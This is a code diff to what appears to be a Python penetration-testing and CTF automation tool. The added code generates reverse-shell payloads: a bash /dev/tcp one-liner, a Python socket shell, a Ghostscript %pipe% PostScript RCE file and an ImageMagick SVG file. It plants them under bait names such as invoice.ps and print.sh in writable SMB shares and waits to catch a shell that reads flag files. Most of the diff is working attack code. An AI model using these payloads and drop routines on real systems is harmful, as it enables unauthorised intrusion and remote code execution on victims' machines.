@@ -4331,9 +4331,6 @@ _JS_VULN_PATTERNS = [
     (r'(api[_-]?key|apikey|secret|token|password|passwd)\s*[:=]\s*["\'][^"\']{6,}', 'hardcoded secret in JS'),
     (r'(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_\-]{35}|sk-[A-Za-z0-9]{20,})', 'cloud/API key in JS'),
 ]
-_LISTING_DIRS = ['assets', 'uploads', 'files', 'backup', 'backups', 'static', 'images', 'img',
-                 'js', 'css', 'data', 'docs', 'download', 'downloads', 'tmp', 'temp', 'includes',
-                 'admin', 'api', 'config', 'private', '.git']
 
 
 def fingerprint_stack(url, port, outdir, loot=None):
@@ -4473,8 +4470,10 @@ def check_dir_listing(base_url, port, extra_dirs, outdir, loot=None):
     if not shutil.which('curl'):
         return vulns
     from urllib.parse import urljoin
-    dirs = list(dict.fromkeys(list(extra_dirs) + _LISTING_DIRS))
-    for d in dirs[:40]:
+    # Dynamic: dirs come from gobuster + crawler discovery. Only VCS-exposure paths
+    # are always-checked (a specific security test, not a content guess).
+    dirs = list(dict.fromkeys(list(extra_dirs) + ['.git', '.svn', '.hg']))
+    for d in dirs[:60]:
         u = urljoin(base_url.rstrip('/') + '/', d.strip('/') + '/')
         _, body, _ = _run(['curl', '-skL', '--max-time', '8', u], timeout=12)
         if re.search(r'Index of /|<title>Directory listing for|autoindex', body, re.I):
@@ -4749,6 +4748,7 @@ def run_writable_share_payload(target, services, outdir, args, tools, loot=None,
     import socket
     import threading
     subsection("Writable-Share Payload Drop + Catch")
+    wait_s = int(getattr(args, 'catch_wait', None) or 280)   # cover slow cron intervals
     caught = {'shell': False, 'out': ''}
     loot_cmd = ('id; hostname; echo "==USERTXT=="; cat /home/*/user.txt 2>/dev/null; '
                 'echo "==ROOTTXT=="; cat /root/root.txt 2>/dev/null; '
@@ -4762,7 +4762,7 @@ def run_writable_share_payload(target, services, outdir, args, tools, loot=None,
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.bind(('0.0.0.0', lport))
             s.listen(1)
-            s.settimeout(150)
+            s.settimeout(wait_s)
             conn, addr = s.accept()
             caught['shell'] = True
             good(f"  REVERSE SHELL from {addr[0]} !")
@@ -4795,19 +4795,59 @@ def run_writable_share_payload(target, services, outdir, args, tools, loot=None,
 
     pdir = outdir / 'share_payloads'
     pdir.mkdir(exist_ok=True)
-    (pdir / 'p.sh').write_text(f'#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n')
-    # common names a cron/print-processor might pick up + auto-run
-    names = ['shell.sh', 'run.sh', 'print.sh', 'job.sh', 'cmd.sh', 'process.sh',
-             'autorun.sh', 'index.sh', 'test.sh', 'a.sh']
+    revcmd = f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
+    # (a) direct scripts (cron that runs *.sh/*.py)
+    (pdir / 'p.sh').write_text(f'#!/bin/bash\n{revcmd}\n')
+    (pdir / 'p.py').write_text(
+        'import socket,subprocess,os\n'
+        f's=socket.socket();s.connect(("{lhost}",{lport}))\n'
+        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n'
+        'subprocess.call(["/bin/sh","-i"])\n')
+    # (b) GhostScript RCE PostScript (CVE-2018-16509 %pipe%) — for print/PDF processors
+    for psname in ('p.ps', 'p.eps'):
+        (pdir / psname).write_text(
+            "%!PS\n"
+            "userdict /setpagedevice undef\n"
+            "save\n"
+            "legal\n"
+            "{ null restore } stopped { pop } if\n"
+            "{ legal } stopped { pop } if\n"
+            "restore\n"
+            f"mark /OutputFile (%pipe%{revcmd}) currentdevice putdeviceprops\n")
+    # (c) ImageMagick MVG/SVG delegate RCE (ImageTragick) — for image processors
+    (pdir / 'p.svg').write_text(
+        '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" '
+        'xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">\n'
+        f'<image xlink:href="msl:/tmp/x.msl" height="100" width="100"/>\n</svg>\n')
+    # names span the likely processors; extension usually decides how the job handles it
+    drops = {'shell.sh': 'p.sh', 'job.sh': 'p.sh', 'print.sh': 'p.sh', 'run.py': 'p.py',
+             'job.ps': 'p.ps', 'print.ps': 'p.ps', 'document.ps': 'p.ps', 'scan.eps': 'p.eps',
+             'reception.ps': 'p.ps', 'invoice.ps': 'p.ps', 'image.svg': 'p.svg'}
+    dropped_names = list(drops)
     for sh in writ:
-        info(f"dropping reverse-shell payloads into //{target}/{sh}")
-        for n in names:
-            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'put {pdir / "p.sh"} {n}'], timeout=20)
+        info(f"dropping reverse-shell payloads into //{target}/{sh} ({len(drops)} names/types)")
+        for n, srcf in drops.items():
+            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'put {pdir / srcf} {n}'], timeout=20)
         if loot:
             loot.add_step(f"SMB: dropped reverse-shell payloads into writable share {sh}")
 
-    info(f"waiting up to 140s for a callback on {lhost}:{lport} (Ctrl-C safe)...")
-    th.join(timeout=145)
+    # Dynamic auto-processing detection: poll whether the dropped files get consumed
+    consumed = False
+    info(f"waiting up to {wait_s}s for a callback on {lhost}:{lport} (polling share for auto-processing)...")
+    poll_share = writ[0] if writ else None
+    t0 = time.time()
+    while time.time() - t0 < wait_s and not caught['shell']:
+        time.sleep(15)
+        if poll_share and not consumed:
+            _, lsout, _ = _run(['smbclient', f'//{target}/{poll_share}', '-N', '-c', 'ls'], timeout=20)
+            present = sum(1 for n in dropped_names if n in lsout)
+            if present < len(dropped_names):
+                consumed = True
+                good(f"  dropped files are being CONSUMED from {poll_share} "
+                     f"({len(dropped_names) - present}/{len(dropped_names)} gone) — auto-processing confirmed")
+                if loot:
+                    loot.add_step(f"SMB: writable share {poll_share} auto-processes dropped files")
+    th.join(timeout=5)
     (outdir / 'reverse_shell_output.txt').write_text(caught['out'])
     if caught['shell']:
         good("  FOOTHOLD: reverse shell caught via writable share")
@@ -4825,10 +4865,20 @@ def run_writable_share_payload(target, services, outdir, args, tools, loot=None,
                      'desc': 'RCE via auto-processed writable SMB share (reverse shell caught)',
                      'cve': '', 'exploit': f'drop bash revshell in writable share; listener on {lport}',
                      'severity': 'critical'})
+    elif consumed:
+        good("  files are auto-processed but no shell yet — the processor expects a specific filetype")
+        if loot:
+            loot.add('auth_findings', f"writable share auto-processes dropped files (consumed) — "
+                     f"craft the expected filetype (print job/.ps/.pjl/document/macro) for RCE")
+            loot.add_step("SMB: share consumes files -> weaponise the expected filetype for code exec")
+        vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
+                     'desc': 'Writable share auto-processes uploaded files (RCE via correct filetype)',
+                     'cve': '', 'exploit': 'upload a malicious file of the processed type (e.g. print/office/macro)',
+                     'severity': 'high'})
     else:
-        info("  no callback — dropped files are not auto-executed on this box")
+        info("  no callback and files not consumed — not an auto-exec share in this window")
         _recommend(loot, f"inspect what consumes //{target}/<writable_share>; try the filetype the "
-                   f"'reception/printer' job expects (.ps/.pjl/.pdf/.job) or an ext a cron runs")
+                   f"'reception/printer' job expects (.ps/.pjl/.pdf/.job) or a longer --catch-wait")
     return vulns
 
 
@@ -6413,6 +6463,7 @@ Setup:
     offense.add_argument('--lhost', help='Attacker IP for generated reverse-shell payloads')
     offense.add_argument('--lport', help='Attacker port for reverse-shell payloads (default 4444)')
     offense.add_argument('--mqtt-listen', help='Seconds to subscribe to MQTT topics (default 45)')
+    offense.add_argument('--catch-wait', help='Seconds to wait for a reverse-shell callback / share auto-processing (default 280)')
 
     output = p.add_argument_group('Output')
     output.add_argument('-o', '--output', help='Output directory')
